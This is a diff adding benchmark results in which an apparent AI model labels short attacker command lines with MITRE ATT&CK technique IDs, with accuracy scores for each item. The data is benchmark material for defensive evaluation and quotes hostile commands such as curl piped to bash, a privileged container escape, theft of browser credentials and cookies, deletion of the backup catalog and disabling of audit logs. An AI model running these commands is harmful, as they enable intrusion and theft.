@@ -3826,5 +3826,1561 @@
       "gpt_top1_correct": false,
       "gpt_top3_correct": false
     }
+  ],
+  "claude": {
+    "top1": 0.4369747899159664,
+    "top3": 0.5714285714285714,
+    "avg_ms": 1841.8773109243689,
+    "model": "claude-opus-4-7",
+    "date": "2026-04-20 16:30:42"
+  },
+  "claude_results": [
+    {
+      "id": 1,
+      "gt": "T1562",
+      "command": "auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable",
+      "claude_top3": [
+        "T1562",
+        "T1562",
+        "T1070"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2501.5
+    },
+    {
+      "id": 2,
+      "gt": "T1112",
+      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f",
+      "claude_top3": [
+        "T1112",
+        "T1090",
+        "T1071"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1354.2
+    },
+    {
+      "id": 3,
+      "gt": "T1005",
+      "command": "ntpdate -a x -k /path/to/input-file -d localhost",
+      "claude_top3": [
+        "T1124",
+        "T1059",
+        "T1070"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1720.8
+    },
+    {
+      "id": 4,
+      "gt": "T1040",
+      "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i $interface -c 5",
+      "claude_top3": [
+        "T1040",
+        "T1059",
+        "T1005"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1208.0
+    },
+    {
+      "id": 5,
+      "gt": "T1574",
+      "command": "readdir",
+      "claude_top3": [
+        "T1083",
+        "T1087",
+        "T1082"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2186.4
+    },
+    {
+      "id": 6,
+      "gt": "T1543",
+      "command": "echo \"ExecStart=$execstart_action\" >> $systemd_service_path/$systemd_service_file",
+      "claude_top3": [
+        "T1543",
+        "T1059",
+        "T1546"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2640.9
+    },
+    {
+      "id": 7,
+      "gt": "T1140",
+      "command": "echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p",
+      "claude_top3": [
+        "T1140",
+        "T1027",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1308.8
+    },
+    {
+      "id": 8,
+      "gt": "T1132",
+      "command": "zlib",
+      "claude_top3": [
+        "T1560",
+        "T1027",
+        "T1132"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1021.4
+    },
+    {
+      "id": 9,
+      "gt": "T1480",
+      "command": "{12d61a41-4b74-7610-a4d8-3028d2f56395}",
+      "claude_top3": [
+        "T1059",
+        "T1218",
+        "T1027"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1806.9
+    },
+    {
+      "id": 10,
+      "gt": "T1555",
+      "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"",
+      "claude_top3": [
+        "T1555",
+        "T1555",
+        "T1005"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1189.7
+    },
+    {
+      "id": 11,
+      "gt": "T1560",
+      "command": "zip",
+      "claude_top3": [
+        "T1560",
+        "T1020",
+        "T1041"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1269.7
+    },
+    {
+      "id": 12,
+      "gt": "T1124",
+      "command": "net time \\\\$computer_name",
+      "claude_top3": [
+        "T1124",
+        "T1018",
+        "T1049"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2494.0
+    },
+    {
+      "id": 13,
+      "gt": "T1069",
+      "command": "az ad user get-member-groups",
+      "claude_top3": [
+        "T1087",
+        "T1069",
+        "T1526"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1269.9
+    },
+    {
+      "id": 14,
+      "gt": "T1071",
+      "command": "Set-Location \"PathToAtomicsFolder\"",
+      "claude_top3": [
+        "T1059",
+        "T1059",
+        "T1047"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1110.3
+    },
+    {
+      "id": 15,
+      "gt": "T1027",
+      "command": "HKLM\\SOFTWARE\\Plus",
+      "claude_top3": [
+        "T1112",
+        "T1547",
+        "T1012"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1428.9
+    },
+    {
+      "id": 16,
+      "gt": "T1127",
+      "command": "csc.exe -out:{PATH:.exe} {PATH:.cs}",
+      "claude_top3": [
+        "T1027",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1342.6
+    },
+    {
+      "id": 17,
+      "gt": "T1036",
+      "command": "System.Console.WriteLine(\"tweet, tweet\");",
+      "claude_top3": [
+        "T1059",
+        "T1059",
+        "T1106"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2013.0
+    },
+    {
+      "id": 18,
+      "gt": "T1059",
+      "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file",
+      "claude_top3": [
+        "T1059",
+        "T1059",
+        "T1036"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2532.0
+    },
+    {
+      "id": 19,
+      "gt": "T1547",
+      "command": "HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "claude_top3": [
+        "T1547",
+        "T1112",
+        "T1012"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2366.2
+    },
+    {
+      "id": 20,
+      "gt": "T1222",
+      "command": "exiftool \"-description<=/path/to/input-file --filename /path/to/output-file",
+      "claude_top3": [
+        "T1027",
+        "T1564",
+        "T1070"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1162.0
+    },
+    {
+      "id": 21,
+      "gt": "T1548",
+      "command": "make /tmp/hello",
+      "claude_top3": [
+        "T1059",
+        "T1059",
+        "T1036"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 3274.9
+    },
+    {
+      "id": 22,
+      "gt": "T1558",
+      "command": "echo End of Golden Ticket attack",
+      "claude_top3": [
+        "T1558",
+        "T1059",
+        "T1078"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2279.0
+    },
+    {
+      "id": 23,
+      "gt": "T1505",
+      "command": ".vgz",
+      "claude_top3": [
+        "T1204",
+        "T1036",
+        "T1027"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1192.0
+    },
+    {
+      "id": 24,
+      "gt": "T1106",
+      "command": "VirtualFree",
+      "claude_top3": [
+        "T1055",
+        "T1027",
+        "T1620"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1884.2
+    },
+    {
+      "id": 25,
+      "gt": "T1016",
+      "command": "foreach ($port in $ports) {",
+      "claude_top3": [
+        "T1046",
+        "T1059",
+        "T1018"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2223.6
+    },
+    {
+      "id": 26,
+      "gt": "T1566",
+      "command": "[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)",
+      "claude_top3": [
+        "T1059",
+        "T1106",
+        "T1056"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2181.5
+    },
+    {
+      "id": 27,
+      "gt": "T1219",
+      "command": "Start-Process $file1 /S;",
+      "claude_top3": [
+        "T1204",
+        "T1059",
+        "T1106"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1749.7
+    },
+    {
+      "id": 28,
+      "gt": "T1070",
+      "command": "cmd.exe /c del",
+      "claude_top3": [
+        "T1070",
+        "T1059",
+        "T1485"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2562.3
+    },
+    {
+      "id": 29,
+      "gt": "T1218",
+      "command": "Crash",
+      "claude_top3": [
+        "T1059",
+        "T1499",
+        "T1489"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2148.0
+    },
+    {
+      "id": 30,
+      "gt": "T1105",
+      "command": "rbc.close();",
+      "claude_top3": [
+        "T1059",
+        "T1106",
+        "T1070"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1021.1
+    },
+    {
+      "id": 31,
+      "gt": "T1087",
+      "command": "cmd.exe /c net user {Username}",
+      "claude_top3": [
+        "T1087",
+        "T1059",
+        "T1033"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1241.6
+    },
+    {
+      "id": 32,
+      "gt": "T1003",
+      "command": "Invoke-PowerDump",
+      "claude_top3": [
+        "T1003",
+        "T1059",
+        "T1003"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1127.1
+    },
+    {
+      "id": 33,
+      "gt": "T1204",
+      "command": "$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"",
+      "claude_top3": [
+        "T1059",
+        "T1027",
+        "T1140"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1094.0
+    },
+    {
+      "id": 34,
+      "gt": "T1053",
+      "command": "SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00",
+      "claude_top3": [
+        "T1053",
+        "T1547",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2248.4
+    },
+    {
+      "id": 35,
+      "gt": "T1491",
+      "command": "echo \"\" | \"$plink_file\" -batch \"$vm_host\" -ssh -l $vm_user -pw \"$vm_pass\" \"esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'\"",
+      "claude_top3": [
+        "T1021",
+        "T1486",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2075.3
+    },
+    {
+      "id": 36,
+      "gt": "T1055",
+      "command": ".text",
+      "claude_top3": [
+        "T1027",
+        "T1055",
+        "T1106"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1783.1
+    },
+    {
+      "id": 37,
+      "gt": "T1012",
+      "command": "Windows\\CurrentVersion\\Uninstall",
+      "claude_top3": [
+        "T1012",
+        "T1082",
+        "T1518"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1831.6
+    },
+    {
+      "id": 38,
+      "gt": "T1134",
+      "command": "PPID-Spoof -ppid $ppid -spawnto \"$spawnto_process_path\" -dllpath \"$dll_path\"",
+      "claude_top3": [
+        "T1134",
+        "T1055",
+        "T1574"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1112.0
+    },
+    {
+      "id": 39,
+      "gt": "T1546",
+      "command": "\"import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))\" | Out-File -Encoding ASCII \"$SitePackages\\atomic_hook.pth\"",
+      "claude_top3": [
+        "T1546",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1315.2
+    },
+    {
+      "id": 40,
+      "gt": "T1556",
+      "command": "userParameters",
+      "claude_top3": [
+        "T1059",
+        "T1204",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2823.7
+    },
+    {
+      "id": 41,
+      "gt": "T1018",
+      "command": "net group \"Domain Controllers\" /domain",
+      "claude_top3": [
+        "T1087",
+        "T1018",
+        "T1069"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1839.4
+    },
+    {
+      "id": 42,
+      "gt": "T1486",
+      "command": "echo \"Hi friends\" >> $env:Userprofile\\Desktop\\akira_readme.txt",
+      "claude_top3": [
+        "T1486",
+        "T1059",
+        "T1083"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1411.4
+    },
+    {
+      "id": 43,
+      "gt": "T1083",
+      "command": "ls -a >> $output_file",
+      "claude_top3": [
+        "T1083",
+        "T1005",
+        "T1074"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1395.8
+    },
+    {
+      "id": 44,
+      "gt": "T1078",
+      "command": "New-AzAutomationRunbook -Name $runbook_name -Type PowerShell -ResourceGroupName $resource_group -Description 'my-test-runbook' -AutomationAccountName $automation_account_name",
+      "claude_top3": [
+        "T1648",
+        "T1059",
+        "T1578"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1949.3
+    },
+    {
+      "id": 45,
+      "gt": "T1539",
+      "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"$destination_path\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",
+      "claude_top3": [
+        "T1539",
+        "T1059",
+        "T1005"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 5309.8
+    },
+    {
+      "id": 46,
+      "gt": "T1485",
+      "command": "PutLifecycleConfiguration",
+      "claude_top3": [
+        "T1530",
+        "T1485",
+        "T1537"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1819.8
+    },
+    {
+      "id": 47,
+      "gt": "T1114",
+      "command": "New-MailboxExportRequest",
+      "claude_top3": [
+        "T1114",
+        "T1213",
+        "T1005"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1826.9
+    },
+    {
+      "id": 48,
+      "gt": "T1614",
+      "command": "GetKeyboardType",
+      "claude_top3": [
+        "T1056",
+        "T1082",
+        "T1497"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1435.7
+    },
+    {
+      "id": 49,
+      "gt": "T1528",
+      "command": "Write-Output \"Function code upload failed.\"",
+      "claude_top3": [
+        "T1059",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1503.6
+    },
+    {
+      "id": 50,
+      "gt": "T1041",
+      "command": "Resolve-DnsName -Name $dnsQuery",
+      "claude_top3": [
+        "T1071",
+        "T1059",
+        "T1008"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2780.4
+    },
+    {
+      "id": 51,
+      "gt": "T1098",
+      "command": "Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue",
+      "claude_top3": [
+        "T1098",
+        "T1078",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2611.7
+    },
+    {
+      "id": 52,
+      "gt": "T1564",
+      "command": "/etc/rc.local.d/local.sh",
+      "claude_top3": [
+        "T1037",
+        "T1059",
+        "T1547"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1392.7
+    },
+    {
+      "id": 53,
+      "gt": "T1001",
+      "command": "$base64Strings | Set-Content \"$HOME\\decoded.ps1\"",
+      "claude_top3": [
+        "T1140",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1765.2
+    },
+    {
+      "id": 54,
+      "gt": "T1217",
+      "command": "dir /s /b %USERPROFILE%\\Favorites",
+      "claude_top3": [
+        "T1083",
+        "T1217",
+        "T1005"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 2716.2
+    },
+    {
+      "id": 55,
+      "gt": "T1137",
+      "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\" /v Level /t REG_DWORD /d 1 /f",
+      "claude_top3": [
+        "T1112",
+        "T1562",
+        "T1137"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1973.1
+    },
+    {
+      "id": 56,
+      "gt": "T1074",
+      "command": "a9850d2f",
+      "claude_top3": [
+        "T1059",
+        "T1027",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 978.2
+    },
+    {
+      "id": 57,
+      "gt": "T1082",
+      "command": "cat /etc/*release | uniq",
+      "claude_top3": [
+        "T1082",
+        "T1083",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1963.7
+    },
+    {
+      "id": 58,
+      "gt": "T1136",
+      "command": "echo \"$password\" | pw usermod $username -h 0",
+      "claude_top3": [
+        "T1098",
+        "T1059",
+        "T1552"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 3761.5
+    },
+    {
+      "id": 59,
+      "gt": "T1056",
+      "command": "write-warning $cred.GetNetworkCredential().Password",
+      "claude_top3": [
+        "T1555",
+        "T1059",
+        "T1552"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1224.6
+    },
+    {
+      "id": 60,
+      "gt": "T1529",
+      "command": "SeShutdownPrivilege",
+      "claude_top3": [
+        "T1078",
+        "T1134",
+        "T1484"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2501.4
+    },
+    {
+      "id": 61,
+      "gt": "T1046",
+      "command": "spoolvulnscan -noninteractive -consoleoutput",
+      "claude_top3": [
+        "T1210",
+        "T1046",
+        "T1068"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1219.6
+    },
+    {
+      "id": 62,
+      "gt": "T1201",
+      "command": "Get-PassPol",
+      "claude_top3": [
+        "T1201",
+        "T1059",
+        "T1087"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2402.9
+    },
+    {
+      "id": 63,
+      "gt": "T1037",
+      "command": "sudo chmod +x /etc/rc.local",
+      "claude_top3": [
+        "T1037",
+        "T1222",
+        "T1548"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1411.8
+    },
+    {
+      "id": 64,
+      "gt": "T1021",
+      "command": "vim-cmd hostsvc/enable_ssh",
+      "claude_top3": [
+        "T1021",
+        "T1562",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1376.1
+    },
+    {
+      "id": 65,
+      "gt": "T1559",
+      "command": "NSXPCConnection API",
+      "claude_top3": [
+        "T1559",
+        "T1071",
+        "T1021"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1169.7
+    },
+    {
+      "id": 66,
+      "gt": "T1135",
+      "command": "smbutil view -g //$computer_name",
+      "claude_top3": [
+        "T1135",
+        "T1021",
+        "T1018"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2613.1
+    },
+    {
+      "id": 67,
+      "gt": "T1057",
+      "command": "CreateToolhelp32Snapshot",
+      "claude_top3": [
+        "T1057",
+        "T1518",
+        "T1055"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2138.5
+    },
+    {
+      "id": 68,
+      "gt": "T1007",
+      "command": "FAX",
+      "claude_top3": [
+        "T1059",
+        "T1218",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1860.0
+    },
+    {
+      "id": 69,
+      "gt": "T1553",
+      "command": "g_CiOptions",
+      "claude_top3": [
+        "T1562",
+        "T1112",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1559.6
+    },
+    {
+      "id": 70,
+      "gt": "T1619",
+      "command": "QueueName = \"\"",
+      "claude_top3": [
+        "T1059",
+        "T1053",
+        "T1027"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2515.5
+    },
+    {
+      "id": 71,
+      "gt": "T1202",
+      "command": "procdump.exe -md {PATH:.dll} foobar",
+      "claude_top3": [
+        "T1003",
+        "T1055",
+        "T1218"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1709.2
+    },
+    {
+      "id": 72,
+      "gt": "T1047",
+      "command": "wmic process call create $process_to_execute",
+      "claude_top3": [
+        "T1047",
+        "T1059",
+        "T1106"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1751.1
+    },
+    {
+      "id": 73,
+      "gt": "T1518",
+      "command": "Get-NetFirewallSetting",
+      "claude_top3": [
+        "T1016",
+        "T1082",
+        "T1518"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 2784.3
+    },
+    {
+      "id": 74,
+      "gt": "T1622",
+      "command": "CheckRemoteDebuggerPresent",
+      "claude_top3": [
+        "T1622",
+        "T1497",
+        "T1027"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1990.4
+    },
+    {
+      "id": 75,
+      "gt": "T1113",
+      "command": "screencapture -x $output_file",
+      "claude_top3": [
+        "T1113",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1622.6
+    },
+    {
+      "id": 76,
+      "gt": "T1216",
+      "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
+      "claude_top3": [
+        "T1059",
+        "T1218",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1642.9
+    },
+    {
+      "id": 77,
+      "gt": "T1567",
+      "command": "$env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"",
+      "claude_top3": [
+        "T1552",
+        "T1078",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1511.5
+    },
+    {
+      "id": 78,
+      "gt": "T1550",
+      "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",
+      "claude_top3": [
+        "T1558",
+        "T1550",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1782.9
+    },
+    {
+      "id": 79,
+      "gt": "T1048",
+      "command": "else",
+      "claude_top3": [
+        "T1059",
+        "T1106",
+        "T1027"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2503.8
+    },
+    {
+      "id": 80,
+      "gt": "T1090",
+      "command": "networksetup -setsecurewebproxy $interface $proxy_server $proxy_port",
+      "claude_top3": [
+        "T1090",
+        "T1572",
+        "T1071"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1240.1
+    },
+    {
+      "id": 81,
+      "gt": "T1680",
+      "command": "IOCTL_DISK_GET_DRIVE_GEOMETRY",
+      "claude_top3": [
+        "T1497",
+        "T1082",
+        "T1622"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 3114.0
+    },
+    {
+      "id": 82,
+      "gt": "T1119",
+      "command": "wmic process list > %TEMP%\\T1119_3.txt",
+      "claude_top3": [
+        "T1119",
+        "T1047",
+        "T1074"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1711.6
+    },
+    {
+      "id": 83,
+      "gt": "T1049",
+      "command": "GetExtendedTcpTable",
+      "claude_top3": [
+        "T1049",
+        "T1046",
+        "T1082"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2183.1
+    },
+    {
+      "id": 84,
+      "gt": "T1482",
+      "command": "\"$trufflesnout_path\" forest -n $domain",
+      "claude_top3": [
+        "T1087",
+        "T1482",
+        "T1018"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1677.5
+    },
+    {
+      "id": 85,
+      "gt": "T1552",
+      "command": "Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key",
+      "claude_top3": [
+        "T1552",
+        "T1606",
+        "T1649"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1084.1
+    },
+    {
+      "id": 86,
+      "gt": "T1611",
+      "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'",
+      "claude_top3": [
+        "T1611",
+        "T1610",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2385.4
+    },
+    {
+      "id": 87,
+      "gt": "T1033",
+      "command": "getUsername",
+      "claude_top3": [
+        "T1033",
+        "T1087",
+        "T1082"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1304.4
+    },
+    {
+      "id": 88,
+      "gt": "T1569",
+      "command": "launchctl unload",
+      "claude_top3": [
+        "T1569",
+        "T1543",
+        "T1562"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1775.3
+    },
+    {
+      "id": 89,
+      "gt": "T1129",
+      "command": "OpenSSH",
+      "claude_top3": [
+        "T1021",
+        "T1563",
+        "T1098"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2712.1
+    },
+    {
+      "id": 90,
+      "gt": "T1497",
+      "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;",
+      "claude_top3": [
+        "T1497",
+        "T1082",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1041.3
+    },
+    {
+      "id": 91,
+      "gt": "T1489",
+      "command": "taskkill",
+      "claude_top3": [
+        "T1562",
+        "T1489",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1591.0
+    },
+    {
+      "id": 92,
+      "gt": "T1115",
+      "command": "Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"",
+      "claude_top3": [
+        "T1115",
+        "T1059",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1588.4
+    },
+    {
+      "id": 93,
+      "gt": "T1110",
+      "command": "su -c \"cd /tmp; curl -s $remote_url | bash\" art",
+      "claude_top3": [
+        "T1059",
+        "T1105",
+        "T1548"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1439.0
+    },
+    {
+      "id": 94,
+      "gt": "T1484",
+      "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force",
+      "claude_top3": [
+        "T1562",
+        "T1112",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1724.3
+    },
+    {
+      "id": 95,
+      "gt": "T1526",
+      "command": "Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment",
+      "claude_top3": [
+        "T1078",
+        "T1098",
+        "T1552"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2993.5
+    },
+    {
+      "id": 96,
+      "gt": "T1573",
+      "command": "{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",
+      "claude_top3": [
+        "T1059",
+        "T1027",
+        "T1105"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1219.2
+    },
+    {
+      "id": 97,
+      "gt": "T1490",
+      "command": "wbadmin.exe delete catalog -quiet",
+      "claude_top3": [
+        "T1490",
+        "T1070",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2079.8
+    },
+    {
+      "id": 98,
+      "gt": "T1620",
+      "command": "execute-assembly",
+      "claude_top3": [
+        "T1055",
+        "T1620",
+        "T1059"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 2244.7
+    },
+    {
+      "id": 99,
+      "gt": "T1205",
+      "command": "eth0",
+      "claude_top3": [
+        "T1016",
+        "T1049",
+        "T1040"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1610.3
+    },
+    {
+      "id": 100,
+      "gt": "T1554",
+      "command": "/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.",
+      "claude_top3": [
+        "T1059",
+        "T1505",
+        "T1106"
+      ],
